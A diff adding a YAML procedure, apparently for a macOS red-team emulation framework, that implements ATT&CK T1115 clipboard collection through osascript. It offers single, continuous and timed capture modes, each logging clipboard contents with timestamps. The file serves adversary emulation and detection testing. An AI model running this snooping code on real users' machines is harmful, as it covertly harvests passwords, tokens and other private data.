@@ -1,0 +1,143 @@
+procedure_name: clipboard_monitoring
+ttp_id: T1115
+tactic: Collection
+guid: 22a27175-bc55-4ff0-86a2-48d9e806c711
+intent: Monitor and collect sensitive clipboard data using osascript over defined
+  time periods
+author: '@darmado | https://x.com/darmad0'
+version: 1.0.4
+created: '2025-01-02'
+updated: '2025-06-03'
+procedure:
+  arguments:
+  - option: --single-capture
+    description: Capture current clipboard contents once
+    execute_function:
+    - single_clipboard_capture
+  - option: --monitor-continuous
+    description: Monitor clipboard contents continuously
+    execute_function:
+    - monitor_clipboard
+  - option: --timed-capture
+    description: Capture clipboard at specified intervals
+    execute_function:
+    - timed_clipboard_capture
+  - option: --duration
+    description: Duration to monitor clipboard (in seconds)
+    type: integer
+    execute_function:
+    - timed_clipboard_capture
+  - option: --interval
+    description: Interval between captures (in seconds)
+    type: integer
+    execute_function:
+    - timed_clipboard_capture
+  global_variable:
+  - name: DEFAULT_DURATION
+    type: string
+    default_value: '60'
+  - name: DEFAULT_INTERVAL
+    type: string
+    default_value: '10'
+  - name: OUTPUT_FILE
+    type: string
+    default_value: /tmp/clipdata.txt
+  functions:
+  - name: single_clipboard_capture
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      single_clipboard_capture() {
+          $CMD_PRINTF "CLIPBOARD_CAPTURE|SINGLE|Capturing current clipboard content\n"
+          
+          # Capture current clipboard using osascript
+          local clipboard_data
+          clipboard_data=$(osascript -e 'return (the clipboard)' 2>/dev/null)
+          
+          if [ $? -eq 0 ] && [ -n "$clipboard_data" ]; then
+              local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+              $CMD_PRINTF "CLIPBOARD_DATA|%s|%s\n" "$timestamp" "$clipboard_data"
+          else
+              $CMD_PRINTF "ERROR|Failed to capture clipboard - may be empty or permission denied\n"
+          fi
+          
+          return 0
+      }
+  - name: monitor_clipboard
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      monitor_clipboard() {
+          $CMD_PRINTF "CLIPBOARD_MONITOR|CONTINUOUS|Starting continuous clipboard monitoring\n"
+          
+          local previous_content=""
+          local iteration=0
+          
+          # Monitor clipboard indefinitely until interrupted
+          while true; do
+              local current_content
+              current_content=$(osascript -e 'return (the clipboard)' 2>/dev/null)
+              
+              if [ $? -eq 0 ] && [ -n "$current_content" ] && [ "$current_content" != "$previous_content" ]; then
+                  local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+                  $CMD_PRINTF "CLIPBOARD_CHANGE|%s|%s\n" "$timestamp" "$current_content"
+                  previous_content="$current_content"
+              fi
+              
+              iteration=$((iteration + 1))
+              if [ $((iteration % 30)) -eq 0 ]; then
+                  $CMD_PRINTF "CLIPBOARD_STATUS|MONITORING|Iteration %d completed\n" "$iteration"
+              fi
+              
+              sleep 2
+          done
+          
+          return 0
+      }
+  - name: timed_clipboard_capture
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      timed_clipboard_capture() {
+          local duration="${DURATION_ARG:-$DEFAULT_DURATION}"
+          local interval="${INTERVAL_ARG:-$DEFAULT_INTERVAL}"
+          
+          $CMD_PRINTF "CLIPBOARD_TIMED|START|Monitoring for %s seconds at %s second intervals\n" "$duration" "$interval"
+          
+          local end_time=$(($(date +%s) + duration))
+          local capture_count=0
+          
+          while [ $(date +%s) -lt $end_time ]; do
+              local clipboard_data
+              clipboard_data=$(osascript -e 'return (the clipboard)' 2>/dev/null)
+              
+              if [ $? -eq 0 ] && [ -n "$clipboard_data" ]; then
+                  local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+                  capture_count=$((capture_count + 1))
+                  $CMD_PRINTF "CLIPBOARD_CAPTURE|%s|Capture %d: %s\n" "$timestamp" "$capture_count" "$clipboard_data"
+              else
+                  local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+                  $CMD_PRINTF "CLIPBOARD_EMPTY|%s|No clipboard content\n" "$timestamp"
+              fi
+              
+              sleep "$interval"
+          done
+          
+          $CMD_PRINTF "CLIPBOARD_COMPLETE|FINISHED|Captured %d clipboard entries over %s seconds\n" "$capture_count" "$duration"
+          return 0
+      }
